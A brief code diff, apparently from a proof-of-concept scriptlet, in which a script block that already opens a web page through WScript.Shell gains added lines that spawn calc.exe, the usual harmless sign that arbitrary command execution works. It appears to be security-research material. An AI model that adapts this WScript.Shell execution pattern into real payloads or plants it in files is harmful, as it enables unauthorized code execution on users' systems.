@@ -8,6 +8,9 @@
 	
 			var c = new ActiveXObject("WScript.Shell");
 			c.Run("iexplore.exe www.nsideattacklogic.de");
+			
+			var d = new ActiveXObject("WScript.Shell");
+			d.Run("calc.exe");
 	
 		]]>
 </script>
